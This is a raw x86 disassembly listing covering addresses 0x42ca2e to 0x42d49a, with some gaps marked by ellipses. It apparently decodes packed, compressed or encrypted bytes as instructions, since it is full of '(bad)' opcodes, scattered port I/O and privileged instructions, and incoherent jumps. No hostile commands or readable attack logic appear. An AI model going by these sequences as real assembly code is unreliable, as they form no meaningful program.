  42ca2e:	pop    ebp
  42ca2f:	jnp    0x42ca3f
  42ca31:	test   DWORD PTR [ecx-0x3e352fdd],0x6d3b0b05
  42ca3b:	add    BYTE PTR [ebp+0x1d],bh
  42ca3e:	cmp    eax,DWORD PTR [esi+ebx*8]
  42ca41:	jmp    0x423bd865
  42ca46:	ret    
  42ca47:	dec    edi
  42ca48:	jns    0x42c9d4
  42ca4a:	dec    esi
  42ca4b:	sbb    dh,cl
  42ca4d:	push   es
  42ca4e:	add    eax,0x2c168761
  42ca53:	jge    0x42ca1a
  42ca55:	jle    0x42ca41
  42ca57:	jmp    0x42c9ed
  42ca59:	dec    esi
  42ca5a:	add    eax,0xf29d755e
  42ca5f:	add    DWORD PTR [esp+ebp*4],eax
  42ca62:	out    0xb4,eax
  42ca64:	(bad)  
  42ca66:	mov    ecx,0x3e154c14
  42ca6b:	or     esi,DWORD PTR [edi-0x10939454]
  42ca71:	add    al,0x6a
  42ca73:	(bad)  
  42ca74:	xor    BYTE PTR [ebx-0x498aa2bd],bh
  42ca7a:	into   
  42ca7b:	xchg   ecx,eax
  42ca7c:	sti    
  42ca7d:	push   edx
  42ca7e:	pushf  
  42ca7f:	mov    ds:0xe2e6d250,al
  42ca84:	push   esp
  42ca85:	shr    BYTE PTR [esi+0x59],1
  42ca88:	mov    bh,BYTE PTR [esi]
  42ca8a:	mov    dl,0x7a
  42ca8c:	mov    cl,0xf7
  42ca8e:	and    edx,ebp
  42ca90:	mov    bh,BYTE PTR [ebx+0x12]
  42ca93:	ds ret 0xb1f7
  42ca97:	push   edi
  42ca98:	ret    
  42ca99:	inc    esi
  42ca9a:	(bad)  
  42ca9b:	js     0x42cad3
  42ca9d:	nop
  42ca9e:	aam    0xd8
  42caa0:	mov    cl,0x3f
  42caa2:	int3   
  42caa3:	fld    QWORD PTR [esp+edx*8+0x6c]
  42caa7:	daa    
  42caa8:	sahf   
  42caa9:	cmp    eax,0xd5b6be2d
  42caae:	cmp    ecx,DWORD PTR [ebp+0x52316a32]
  42cab4:	stc    
  42cab5:	inc    ebp
  42cab6:	mov    ds:0x65a6914c,eax
  42cabb:	popf   
  42cabc:	cli    
  42cabd:	xchg   DWORD PTR [edi-0x12],ebp
  42cac0:	xchg   edi,eax
  42cac1:	mov    BYTE PTR [eax],0x0
	...
  42cb34:	xor    al,0x28
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	ds adc eax,0xd9a0e002
  42cb46:	add    DWORD PTR [eax],eax
  42cb48:	test   BYTE PTR [eax],0x0
  42cb4b:	add    BYTE PTR [ebp-0x63957b29],cl
  42cb51:	jnp    0x42cbaf
  42cb53:	sbb    BYTE PTR [edx],0xe7
  42cb56:	mov    esp,0x36b970d5
  42cb5b:	shl    BYTE PTR [edx],1
  42cb5d:	cmc    
  42cb5e:	adc    DWORD PTR [edi+0x4d464a4],eax
  42cb64:	push   0xe7534b39
  42cb69:	mov    BYTE PTR [esi+0x237cfafb],cl
  42cb6f:	pop    es
  42cb70:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb72:	mov    dh,0x5f
  42cb74:	mov    cl,0x23
  42cb76:	icebp  
  42cb77:	popa   
  42cb78:	fistp  WORD PTR [edi+0x4e]
  42cb7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb7c:	or     edx,esp
  42cb7e:	dec    edi
  42cb7f:	test   BYTE PTR [ebp-0x56],cl
  42cb82:	and    eax,0x2bf70270
  42cb87:	stos   DWORD PTR es:[edi],eax
  42cb88:	push   cs
  42cb89:	sar    BYTE PTR [edi-0x2b23a6e2],cl
  42cb8f:	pop    esi
  42cb90:	xchg   esp,eax
  42cb91:	scas   al,BYTE PTR es:[edi]
  42cb92:	adc    ebp,ebp
  42cb94:	mov    eax,0xad786f9e
  42cb99:	ja     0x42cb43
  42cb9b:	mov    ds:0xfd69b54a,eax
  42cba0:	cmp    DWORD PTR [edi],0xffffffdc
  42cba3:	out    dx,al
  42cba4:	mov    bl,0xaa
  42cba6:	or     BYTE PTR [eax*4-0x74947043],0x42
  42cbae:	adc    DWORD PTR [eax+0x39],edx
  42cbb1:	jmp    0xeb2b364a
  42cbb6:	pop    DWORD PTR [ebp+0x10c170b9]
  42cbbc:	xchg   edi,eax
  42cbbd:	or     DWORD PTR [eax],edx
  42cbbf:	iret   
  42cbc0:	outs   dx,DWORD PTR ds:[esi]
  42cbc1:	adc    bl,0x2d
  42cbc4:	jae    0x42cb97
  42cbc6:	xor    ebp,DWORD PTR [edx-0x31a62ad5]
  42cbcc:	aad    0x28
  42cbce:	xchg   ebp,eax
  42cbcf:	dec    eax
  42cbd0:	sub    al,BYTE PTR [esi+0x40]
  42cbd3:	aaa    
  42cbd4:	adc    BYTE PTR [eax+0x1e],0x8b
  42cbd8:	stc    
  42cbd9:	mov    eax,0xd0d2c2c5
  42cbde:	and    BYTE PTR [edx-0x273e0086],ch
  42cbe4:	pop    esi
  42cbe5:	pop    eax
  42cbe6:	dec    esp
  42cbe7:	out    dx,eax
  42cbe8:	mov    edx,0xd1c94a3b
  42cbed:	(bad)  [esp+edi*1+0x21]
  42cbf1:	xchg   esi,eax
  42cbf2:	jo     0x42cc20
  42cbf4:	inc    edi
  42cbf5:	popa   
  42cbf6:	(bad)  
  42cbf7:	pop    esi
  42cbf8:	mov    al,ds:0xd7ad489b
  42cbfd:	lea    ebx,[ebx-0x3d]
  42cc00:	adc    eax,0xca3cd0e
  42cc05:	js     0x42cbda
  42cc07:	add    al,0xbc
  42cc09:	inc    ebx
  42cc0a:	(bad)  
  42cc0b:	xlat   BYTE PTR ds:[ebx]
  42cc0c:	mov    edi,0x801381c4
  42cc11:	add    BYTE PTR gs:[edi],ah
  42cc14:	add    al,0xda
  42cc16:	sbb    eax,0xc6247672
  42cc1b:	pop    eax
  42cc1c:	mov    ah,0x4b
  42cc1e:	std    
  42cc1f:	adc    eax,0x46ad787a
  42cc24:	dec    edi
  42cc25:	xor    ah,BYTE PTR [edx+edi*1-0x5a22516]
  42cc2c:	outs   dx,DWORD PTR ds:[esi]
  42cc2d:	aam    0xaf
  42cc2f:	cli    
  42cc30:	ins    BYTE PTR es:[edi],dx
  42cc31:	jge    0x42cca4
  42cc33:	int    0xe3
  42cc35:	retf   
  42cc36:	sbb    bl,BYTE PTR [ebp+0x32]
  42cc39:	mov    edx,0x9f05a915
  42cc3e:	or     BYTE PTR [esi+0x3d56],cl
	...
  42ccb4:	mov    al,0xb6
  42ccb6:	pushf  
  42ccb7:	adc    al,0x9e
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    ebx,DWORD PTR [esi-0x695dcfdd]
  42ccc5:	fiadd  DWORD PTR [ecx]
  42ccc7:	add    dh,dh
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    BYTE PTR [ebp+ebx*2-0x46],dh
  42cccf:	jnp    0x42cd4b
  42ccd1:	fsub   QWORD PTR ds:0xe8eda855
  42ccd7:	in     eax,dx
  42ccd8:	(bad)  
  42ccd9:	lock fld DWORD PTR [eax+ebx*2]
  42ccdd:	adc    ebp,DWORD PTR [edx+0x31]
  42cce0:	pop    edx
  42cce1:	int    0x27
  42cce3:	adc    DWORD PTR [ebx-0x1fdf368c],esp
  42cce9:	fwait
  42ccea:	jmp    0x5768:0x42c9e8b1
  42ccf1:	leave  
  42ccf2:	xchg   esi,eax
  42ccf3:	push   ecx
  42ccf4:	outs   dx,BYTE PTR ds:[esi]
  42ccf5:	sti    
  42ccf6:	or     al,0x58
  42ccf8:	xchg   eax,esi
  42ccfa:	jmp    0xde2fe1d7
  42ccff:	in     eax,dx
  42cd00:	jmp    0x42ccbc
  42cd02:	jb     0x42ccf7
  42cd04:	(bad)  
  42cd05:	or     eax,0x96445696
  42cd0a:	les    edx,FWORD PTR [eax+0x13]
  42cd0d:	fnstsw WORD PTR [eax]
  42cd0f:	js     0x42cd0b
  42cd11:	dec    edx
  42cd12:	fprem1 
  42cd14:	aam    0x3b
  42cd16:	jne    0x42ccee
  42cd18:	dec    DWORD PTR [eax+0x5f]
  42cd1b:	dec    ebx
  42cd1c:	(bad)  
  42cd1d:	xchg   ebx,eax
  42cd1e:	mov    BYTE PTR cs:[edi+0x4e0b6d49],dh
  42cd25:	stc    
  42cd26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd27:	mov    dh,BYTE PTR [edi+ecx*2]
  42cd2a:	add    DWORD PTR [ebx-0x2de66e97],0xb6dad453
  42cd34:	fnstsw WORD PTR [ebx-0x46]
  42cd37:	ret    0x98cb
  42cd3a:	mov    ebp,0x2f4cc49f
  42cd3f:	adc    esp,0x82f799c0
  42cd45:	cmp    ecx,esp
  42cd47:	push   cs
  42cd48:	xor    eax,0x781c59fe
  42cd4d:	aaa    
  42cd4e:	xor    esi,DWORD PTR [edi]
  42cd50:	dec    ecx
  42cd51:	out    dx,eax
  42cd52:	jmp    0xe9567f79
  42cd57:	inc    eax
  42cd58:	hlt    
  42cd59:	sbb    al,0x9f
  42cd5b:	popf   
  42cd5c:	and    DWORD PTR [esi+eiz*4+0x36],ebp
  42cd60:	or     DWORD PTR [edx+ebp*2+0x17],ebx
  42cd64:	push   cs
  42cd65:	push   edi
  42cd66:	hlt    
  42cd67:	shl    DWORD PTR [edi],1
  42cd69:	lods   al,BYTE PTR ds:[esi]
  42cd6a:	lods   al,BYTE PTR ds:[esi]
  42cd6b:	push   cs
  42cd6c:	mov    eax,ds:0xf5c8c142
  42cd71:	jmp    0x92b662ad
  42cd76:	adc    esp,DWORD PTR [eax]
  42cd78:	arpl   dx,dx
  42cd7a:	mul    BYTE PTR [eax-0x47]
  42cd7d:	or     ebp,DWORD PTR [ebp-0x6904f957]
  42cd83:	cli    
  42cd84:	cmp    al,0xa7
  42cd86:	aam    0xdb
  42cd88:	jnp    0x42cdab
  42cd8a:	adc    edx,ebx
  42cd8c:	imul   edi,edi,0x23881bdc
  42cd92:	(bad)  
  42cd93:	rcr    DWORD PTR [edi-0x215bac6b],cl
  42cd99:	and    al,dl
  42cd9b:	inc    esi
  42cd9c:	test   BYTE PTR [edi+0x2f],ch
  42cd9f:	sub    eax,0x7c1f5228
  42cda4:	add    BYTE PTR [ebx+0x17],ch
  42cda7:	jle    0x42cd2b
  42cda9:	cmp    al,0x43
  42cdab:	jb     0x42cd45
  42cdad:	push   edx
  42cdae:	mov    esi,0x65abe0c8
  42cdb3:	push   esp
  42cdb4:	sub    BYTE PTR [ecx-0x7e57f4e9],0xa5
  42cdbb:	dec    edx
  42cdbc:	addr16 stc 
  42cdbe:	fs scas eax,DWORD PTR es:[edi]
  42cdc0:	enter  0x7c,0x0
	...
  42ce34:	xchg   edi,eax
  42ce35:	and    BYTE PTR [edi-0x26],al
  42ce38:	idiv   edi
  42ce3a:	lahf   
  42ce3b:	ins    DWORD PTR es:[edi],dx
  42ce3c:	mov    edx,0xd19410a
  42ce41:	out    0x9e,eax
  42ce43:	ror    BYTE PTR [ebx+ebx*8+0xf60001],cl
  42ce4a:	add    BYTE PTR [eax],al
  42ce4c:	mov    ch,0x4
  42ce4e:	sbb    DWORD PTR ds:0x7f1c2c60,ebp
  42ce54:	and    al,0xb0
  42ce56:	pop    eax
  42ce57:	sub    eax,ebx
  42ce59:	mov    ds:0x8aa0747a,al
  42ce5e:	cmp    DWORD PTR [ebx+0x640f409],ecx
  42ce64:	das    
  42ce65:	mov    eax,ds:0x322e755a
  42ce6a:	sar    esp,1
  42ce6c:	sbb    edi,DWORD PTR [edi]
  42ce6e:	pusha  
  42ce6f:	or     esi,DWORD PTR [esi]
  42ce71:	cmp    al,0x7e
  42ce73:	mov    ah,BYTE PTR [ecx+0x3827300b]
  42ce79:	mov    bl,0xc
  42ce7b:	sub    bl,ah
  42ce7d:	xchg   esp,eax
  42ce7e:	jmp    0x42cedd
  42ce80:	add    edi,eax
  42ce82:	dec    esp
  42ce83:	push   cs
  42ce84:	and    eax,ebx
  42ce86:	xor    al,al
  42ce88:	xor    eax,0x4c7e18cf
  42ce8d:	(bad)  
  42ce8e:	mov    eax,0x3f44bf32
  42ce93:	sbb    bh,al
  42ce95:	jne    0x42ce44
  42ce97:	mov    DWORD PTR [ebx+eax*4+0x22a64e51],eax
  42ce9e:	xchg   ebx,eax
  42ce9f:	pop    es
  42cea0:	mov    esi,DWORD PTR [ecx-0x1cca280a]
  42cea6:	jne    0x42ce7a
  42cea8:	fcmovbe st,st(7)
  42ceaa:	jne    0x42cece
  42ceac:	(bad)  
  42cead:	xchg   ebx,eax
  42ceae:	inc    ebx
  42ceaf:	inc    BYTE PTR ds:0x341ab6d3
  42ceb5:	and    DWORD PTR [edx+0x3a831d32],edi
  42cebb:	adc    eax,0xffe99525
  42cec0:	cmp    al,0x4e
  42cec2:	repz mov bh,0x4a
  42cec5:	adc    DWORD PTR [ebx-0x3bd367b6],ebp
  42cecb:	add    BYTE PTR [ebp+0x7d],ch
  42cece:	push   0xa3acdcdf
  42ced3:	in     al,0x71
  42ced5:	(bad)  
  42ced6:	in     eax,dx
  42ced7:	pop    es
  42ced8:	xor    ch,BYTE PTR [ecx]
  42ceda:	rol    DWORD PTR [ebx+0xb],1
  42cedd:	sar    DWORD PTR [eax],cl
  42cedf:	dec    edi
  42cee0:	xchg   BYTE PTR [eax+0x6e1a3a04],bl
  42cee6:	push   ebp
  42cee7:	sub    edx,eax
  42cee9:	mov    BYTE PTR [ebp+esi*1+0x1e],ah
  42ceed:	push   ss
  42ceee:	inc    ebx
  42ceef:	imul   esi,edi,0x2f
  42cef2:	mov    al,0xe4
  42cef4:	pop    esi
  42cef5:	ja     0x42ce91
  42cef7:	lods   al,BYTE PTR ds:[esi]
  42cef8:	mov    edx,0xa865c720
  42cefd:	mov    esp,0xc01428b6
  42cf02:	int    0xb6
  42cf04:	enter  0x3374,0xf6
  42cf08:	mov    eax,ds:0xea95949c
  42cf0d:	xor    eax,0xad6daca6
  42cf12:	adc    eax,0xc6f77fe3
  42cf17:	push   eax
  42cf18:	xor    BYTE PTR [edi-0x74],bl
  42cf1b:	adc    ah,BYTE PTR [ebx-0x755a8cfb]
  42cf21:	adc    eax,0x1aa573b1
  42cf26:	idiv   DWORD PTR [ebp+0x68]
  42cf29:	jo     0x42cf79
  42cf2b:	mov    al,0xe0
  42cf2d:	clc    
  42cf2e:	test   eax,0x56be3e9b
  42cf33:	or     esi,DWORD PTR [edx]
  42cf35:	repnz cmp DWORD PTR [ecx+0x25cd3042],esp
  42cf3c:	mov    eax,0x65906163
  42cf41:	xor    eax,0x0
	...
  42cfb2:	add    BYTE PTR [eax],al
  42cfb4:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0xa9
  42cfc1:	push   ebx
  42cfc2:	or     eax,0x1dc82ba
  42cfc7:	add    dh,dh
  42cfc9:	add    BYTE PTR [eax],al
  42cfcb:	add    BYTE PTR [edx+0x72],dh
  42cfce:	xlat   BYTE PTR ds:[ebx]
  42cfcf:	cmp    BYTE PTR [esi],0x80
  42cfd2:	push   ss
  42cfd3:	cmp    bh,bl
  42cfd5:	xor    BYTE PTR [edx+0x43139004],bl
  42cfdb:	test   al,0x2f
  42cfdd:	sub    edx,DWORD PTR [ebx+0x2c]
  42cfe0:	sbb    eax,0x8dc8c451
  42cfe5:	xor    dl,al
  42cfe7:	cmp    DWORD PTR [ecx-0x5],esp
  42cfea:	sbb    al,0x32
  42cfec:	int    0x5f
  42cfee:	sbb    esp,DWORD PTR [esi]
  42cff0:	pop    ds
  42cff1:	xchg   esi,eax
  42cff2:	and    bl,0x76
  42cff5:	(bad)  
  42cff7:	lods   eax,DWORD PTR ds:[esi]
  42cff8:	or     ecx,eax
  42cffa:	xchg   ecx,eax
  42cffb:	jns    0x42cfce
  42cffd:	inc    esp
  42cffe:	xchg   DWORD PTR [ecx-0x10295c87],esi
  42d004:	mov    esi,0xbb16538c
  42d009:	mov    esp,0xca110b59
  42d00e:	js     0x42d04c
  42d010:	xchg   ecx,eax
  42d011:	mov    dh,0xf
  42d013:	or     DWORD PTR [ebp+0x1c],0xffffffed
  42d017:	fld    st(5)
  42d019:	mov    DWORD PTR [esp+ebp*4+0x19],0xa8f3b399
  42d021:	loope  0x42d05b
  42d023:	sahf   
  42d024:	aas    
  42d025:	loop   0x42d05a
  42d027:	jo     0x42d0a4
  42d029:	inc    ecx
  42d02a:	sti    
  42d02b:	(bad)  
  42d02c:	retf   
  42d02d:	and    BYTE PTR [ebp-0x3b],0x7a
  42d031:	sub    BYTE PTR [eax-0x6],dh
  42d034:	sbb    BYTE PTR [ebp+0x21],dh
  42d037:	out    dx,al
  42d038:	test   BYTE PTR es:[esi-0x635fb785],ah
  42d03f:	push   0x80fef0c9
  42d044:	xchg   ebp,eax
  42d045:	xchg   BYTE PTR [esi-0xfed23de],ah
  42d04b:	fwait
  42d04c:	add    ch,0x4e
  42d04f:	cmc    
  42d050:	cmp    DWORD PTR [esi],eax
  42d052:	cmp    ebp,0x72
  42d055:	mov    ah,0x9a
  42d057:	jbe    0x42d082
  42d059:	pop    ebp
  42d05a:	pop    es
  42d05b:	aas    
  42d05c:	add    al,0x3a
  42d05e:	in     al,0x2e
  42d060:	inc    ecx
  42d061:	(bad)  
  42d062:	mov    edx,0x4df32d3e
  42d067:	cmp    edx,DWORD PTR [edi-0xb]
  42d06a:	ds push 0xff623d6f
  42d070:	into   
  42d071:	cmc    
  42d072:	in     al,0xa6
  42d074:	mov    edi,0xf7439fda
  42d079:	sub    ch,BYTE PTR [ecx+0x3e]
  42d07c:	pop    ds
  42d07d:	es das 
  42d07f:	push   ecx
  42d080:	or     ecx,edx
  42d082:	scas   eax,DWORD PTR es:[edi]
  42d083:	jle    0x42d072
  42d085:	or     al,bh
  42d087:	cli    
  42d088:	adc    edi,ebp
  42d08a:	sbb    BYTE PTR [edi-0x749ac5c0],bl
  42d090:	pusha  
  42d091:	push   ebp
  42d092:	nop
  42d093:	add    eax,0x13cc13c9
  42d098:	test   al,0x4
  42d09a:	sti    
  42d09b:	or     al,0xf6
  42d09d:	jl     0x42d10d
  42d09f:	rcl    BYTE PTR [edx],1
  42d0a1:	mov    esi,0x13b219d1
  42d0a6:	push   eax
  42d0a7:	stos   BYTE PTR es:[edi],al
  42d0a8:	push   es
  42d0a9:	sbb    al,0x20
  42d0ab:	rol    BYTE PTR [ecx],0xdd
  42d0ae:	or     DWORD PTR [edi-0x2e8064db],ecx
  42d0b4:	dec    ecx
  42d0b5:	push   ecx
  42d0b6:	sub    eax,0xa3580948
  42d0bb:	mov    bh,0xd9
  42d0bd:	mov    al,ds:0x50ac98a7
	...
  42d132:	add    BYTE PTR [eax],al
  42d134:	imul   eax,DWORD PTR [edx-0x10105133],0x9941c76b
  42d13e:	xor    eax,0xcb153650
  42d143:	iret   
  42d144:	js     0x42d123
  42d146:	add    DWORD PTR [eax],eax
  42d148:	test   BYTE PTR [eax],0x0
  42d14b:	add    dl,dh
  42d14d:	mov    es,ebp
  42d14f:	stc    
  42d150:	adc    al,0xfb
  42d152:	shl    DWORD PTR [esi-0x1d],1
  42d155:	inc    ebp
  42d156:	add    ch,0x56
  42d159:	inc    ebp
  42d15a:	ja     0x42d1c8
  42d15c:	add    edi,DWORD PTR [ebx]
  42d15e:	ror    BYTE PTR [esp+edx*1],cl
  42d161:	inc    ecx
  42d162:	mov    ds:0x662e33b1,eax
  42d167:	pusha  
  42d168:	out    dx,al
  42d169:	aas    
  42d16a:	inc    eax
  42d16b:	push   edi
  42d16c:	test   esi,edx
  42d16e:	sub    BYTE PTR [eax+0x1f1112e3],ah
  42d174:	clc    
  42d175:	push   ebx
  42d176:	push   ds
  42d177:	jp     0x42d17f
  42d179:	lods   al,BYTE PTR ds:[esi]
  42d17a:	fstp   DWORD PTR [ebx+0x71bde004]
  42d180:	push   edx
  42d181:	and    ecx,ebp
  42d183:	pop    eax
  42d184:	nop
  42d185:	test   al,0x7
  42d187:	jb     0x42d13f
  42d189:	push   edi
  42d18a:	std    
  42d18b:	inc    esp
  42d18c:	aam    0xf2
  42d18e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d18f:	sub    BYTE PTR [eax],bh
  42d191:	icebp  
  42d192:	out    0x96,eax
  42d194:	pop    ds
  42d195:	push   edx
  42d196:	inc    eax
  42d197:	xor    BYTE PTR [eax],al
  42d199:	ja     0x42d14f
  42d19b:	mov    edx,0xb548c701
  42d1a0:	iret   
  42d1a1:	out    dx,al
  42d1a2:	xchg   ecx,eax
  42d1a3:	push   edx
  42d1a4:	xchg   esp,eax
  42d1a5:	xchg   ebx,eax
  42d1a6:	mov    bh,0xfc
  42d1a8:	stc    
  42d1a9:	sub    eax,0xeac69aba
  42d1ae:	mov    bl,0x9b
  42d1b0:	daa    
  42d1b1:	sbb    ebx,edx
  42d1b3:	js     0x42d1b3
  42d1b5:	test   eax,0xa1b10c00
  42d1ba:	pushf  
  42d1bb:	fwait
  42d1bc:	dec    ebp
  42d1bd:	mov    cl,0xf1
  42d1bf:	out    dx,al
  42d1c0:	imul   ecx,ecx,0x3c
  42d1c3:	mov    eax,0xfdd2b7d
  42d1c8:	sub    eax,DWORD PTR [esi]
  42d1ca:	mov    BYTE PTR [ebp-0x591fd79e],0xcb
  42d1d1:	lods   eax,DWORD PTR ds:[esi]
  42d1d2:	addr16 mov bl,0x1a
  42d1d5:	out    dx,eax
  42d1d6:	shl    DWORD PTR [esi+0x6b],0xac
  42d1da:	mov    cs,WORD PTR [eax]
  42d1dc:	lea    esi,[esi]
  42d1de:	arpl   WORD PTR [ecx+0x3605e4d2],ax
  42d1e4:	mov    edx,0xbcd8554e
  42d1e9:	int3   
  42d1ea:	inc    eax
  42d1eb:	add    esi,DWORD PTR [eax+0x75]
  42d1ee:	scas   eax,DWORD PTR es:[edi]
  42d1ef:	jns    0x42d195
  42d1f1:	adc    ecx,edx
  42d1f3:	pop    es
  42d1f4:	in     eax,dx
  42d1f5:	call   DWORD PTR [esp+edi*1-0x2335e4f4]
  42d1fc:	mov    DWORD PTR ds:0xdf7d614c,eax
  42d202:	jle    0x42d260
  42d204:	and    ch,BYTE PTR [ebx+0x2cdfcda]
  42d20a:	ret    0x4090
  42d20d:	jae    0x42d1c5
  42d20f:	aas    
  42d210:	and    al,0xb7
  42d212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d213:	jmp    0xa480cbdf
  42d218:	enter  0x4d10,0x4e
  42d21c:	dec    edi
  42d21d:	inc    esi
  42d21e:	nop    ebp
  42d221:	inc    ecx
  42d222:	loopne 0x42d219
  42d224:	sub    DWORD PTR [ebx],eax
  42d226:	aad    0x96
  42d228:	aam    0x9e
  42d22a:	push   edi
  42d22b:	les    esp,FWORD PTR [ecx+0x44]
  42d22e:	sub    ebx,DWORD PTR [ecx+0x50]
  42d231:	fsub   QWORD PTR [edi+0x19cb5ebf]
  42d237:	push   cs
  42d238:	idiv   esp
  42d23a:	xchg   DWORD PTR [ebx],ebp
  42d23c:	adc    BYTE PTR [esi-0x7e],bl
  42d23f:	out    dx,eax
  42d240:	std    
  42d241:	test   DWORD PTR [eax],eax
	...
  42d2b3:	add    dh,ah
  42d2b5:	psubusw mm5,QWORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	(bad)  
  42d2c1:	push   edi
  42d2c2:	inc    eax
  42d2c3:	dec    edi
  42d2c4:	outs   dx,BYTE PTR ds:[esi]
  42d2c5:	fiadd  WORD PTR [ecx]
  42d2c7:	add    dh,dh
  42d2c9:	add    BYTE PTR [eax],al
  42d2cb:	add    BYTE PTR [eax],cl
  42d2cd:	inc    ecx
  42d2ce:	xor    ecx,ebx
  42d2d0:	shl    DWORD PTR [ebx+esi*8-0x38],1
  42d2d4:	(bad)  [ebx-0x49]
  42d2d7:	cli    
  42d2d8:	(bad)  
  42d2d9:	fdivr  QWORD PTR [edx-0xa]
  42d2dc:	jno    0x42d355
  42d2de:	stos   BYTE PTR es:[edi],al
  42d2df:	inc    edx
  42d2e0:	pop    ds
  42d2e1:	imul   eax,DWORD PTR [eax+ebp*8+0x13],0x10
  42d2e6:	imul   edx,edx,0x50
  42d2e9:	pop    ebx
  42d2ea:	dec    esp
  42d2eb:	xlat   BYTE PTR ds:[ebx]
  42d2ec:	inc    esp
  42d2ed:	aaa    
  42d2ee:	rcl    ch,0x88
  42d2f1:	cmc    
  42d2f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2f3:	jns    0x42d2e8
  42d2f5:	adc    al,BYTE PTR [eax]
  42d2f7:	sub    ah,BYTE PTR [ebx-0x6a4a5c]
  42d2fd:	leave  
  42d2fe:	sub    al,0x56
  42d300:	icebp  
  42d301:	out    dx,al
  42d302:	cld    
  42d303:	loop   0x42d2ed
  42d305:	repz aaa 
  42d307:	cld    
  42d308:	cli    
  42d309:	pop    ecx
  42d30a:	out    0xad,eax
  42d30c:	shr    BYTE PTR [esi+0x67],cl
  42d30f:	or     BYTE PTR [edx-0x30],al
  42d312:	pop    eax
  42d313:	sar    BYTE PTR [edx+edi*8],cl
  42d316:	mov    bh,0x4d
  42d318:	es cs jno 0x42d385
  42d31c:	lahf   
  42d31d:	ficom  WORD PTR [ebx]
  42d31f:	and    eax,0xc3f2c6ec
  42d324:	fs aaa 
  42d326:	inc    edx
  42d327:	popf   
  42d328:	pop    ebp
  42d329:	mov    ah,0xd4
  42d32b:	outs   dx,BYTE PTR ds:[esi]
  42d32c:	into   
  42d32d:	add    eax,0xec5cb89c
  42d332:	push   ds
  42d333:	xor    esi,eax
  42d335:	dec    esi
  42d336:	stc    
  42d337:	out    dx,eax
  42d338:	adc    eax,0x4ae70b41
  42d33d:	mov    ecx,0xba5e9ff0
  42d342:	sbb    BYTE PTR [ebp+0x28df4c27],bh
  42d348:	call   0x1ae3808
  42d34d:	sbb    BYTE PTR [eax+0x687fb29b],al
  42d353:	aas    
  42d354:	in     al,0x98
  42d356:	sub    BYTE PTR [edi],0x5a
  42d359:	cmp    DWORD PTR [ecx+0x7d],esi
  42d35c:	cmp    al,0x7c
  42d35e:	pop    es
  42d35f:	scas   al,BYTE PTR es:[edi]
  42d360:	std    
  42d361:	sub    ebp,esi
  42d363:	cdq    
  42d364:	les    ecx,FWORD PTR [ecx-0x7c]
  42d367:	bound  ebx,QWORD PTR [esi+0x28]
  42d36a:	mov    edx,0xc89cb878
  42d36f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d370:	push   cs
  42d371:	test   eax,0x6ab5baea
  42d376:	xchg   esp,eax
  42d377:	pop    edi
  42d378:	ins    DWORD PTR es:[edi],dx
  42d379:	fstp   st(2)
  42d37b:	jb     0x42d33a
  42d37d:	jmp    0x42d378
  42d37f:	aaa    
  42d380:	xchg   ecx,eax
  42d381:	sub    edi,DWORD PTR [ecx]
  42d383:	(bad)  
  42d384:	fst    QWORD PTR [edi+0x66]
  42d387:	outs   dx,BYTE PTR ds:[esi]
  42d388:	fcmovnb st,st(7)
  42d38a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d38b:	repnz and DWORD PTR [esi+eiz*4-0x57],ebx
  42d390:	int    0xb0
  42d392:	in     eax,dx
  42d393:	xor    al,0xb
  42d395:	sub    esi,DWORD PTR [eax-0x4d01403a]
  42d39b:	gs jb  0x42d3be
  42d39e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d39f:	sbb    BYTE PTR [edi-0x59],al
  42d3a2:	pop    ebx
  42d3a3:	jne    0x42d34e
  42d3a5:	pop    esi
  42d3a6:	or     dl,BYTE PTR [ecx+0x6c]
  42d3a9:	adc    DWORD PTR [ebp+0x27bed0f3],esp
  42d3af:	mov    eax,0x3e17cee5
  42d3b4:	js     0x42d3e4
  42d3b6:	outs   dx,DWORD PTR ds:[esi]
  42d3b7:	in     eax,dx
  42d3b8:	jbe    0x42d432
  42d3ba:	ja     0x42d389
  42d3bc:	ds mov eax,0x270729e8
	...
  42d432:	add    BYTE PTR [eax],al
  42d434:	in     al,dx
  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0x9d420781
  42d442:	sbb    al,0x13
  42d444:	fild   WORD PTR fs:[ecx]
  42d447:	add    dh,dh
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    ah,dl
  42d44d:	ja     0x42d487
  42d44f:	test   eax,0xbba3c1fc
  42d454:	inc    edx
  42d455:	out    dx,al
  42d456:	inc    ecx
  42d457:	out    dx,eax
  42d458:	cmp    eax,0x5a419e
  42d45d:	jmp    0x6ee3:0xba5c6c95
  42d464:	or     DWORD PTR ds:0x7e8fa368,esp
  42d46a:	inc    ebx
  42d46b:	sbb    DWORD PTR [ebx+0x3f6505d4],ebx
  42d471:	cmp    al,0x20
  42d473:	repnz test al,0xd3
  42d476:	loop   0x42d45e
  42d478:	pop    ecx
  42d479:	mov    BYTE PTR [esi+0x61655d8c],0xc3
  42d480:	mov    ds:0x73320bb1,eax
  42d485:	xchg   edx,eax
  42d486:	pop    ds
  42d487:	add    DWORD PTR [ebp+0x5b15e97c],0x1
  42d48e:	and    ebx,DWORD PTR [ecx-0x1e]
  42d491:	fstp   TBYTE PTR [ebx+0x35]
  42d494:	mov    ebx,0xc2554d8f
  42d499:	inc    ebx
  42d49a:	inc    edx
